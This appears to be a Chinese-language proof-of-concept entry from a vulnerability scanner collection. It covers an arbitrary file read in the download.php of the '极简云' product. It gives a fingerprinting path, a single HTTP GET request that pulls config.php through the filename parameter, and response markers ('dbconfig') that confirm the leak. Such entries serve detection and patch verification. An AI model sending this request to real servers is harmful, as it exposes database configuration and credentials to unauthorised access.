﻿# 极简云 download.php 任意文件读取漏洞

> 更新时间：2024-04-07

> 漏洞编号：

> 漏洞说明：

> 漏洞特征："/assets/img/bg/logo_white.png"

> 验证脚本：HTTP

```
GET /download.php?file=20b6cb088a8d5c444074&filename=config.php HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：dbconfig

> 上传文件定位：

> 验证文件来源：极简云 download.php 任意文件读取漏洞.poc

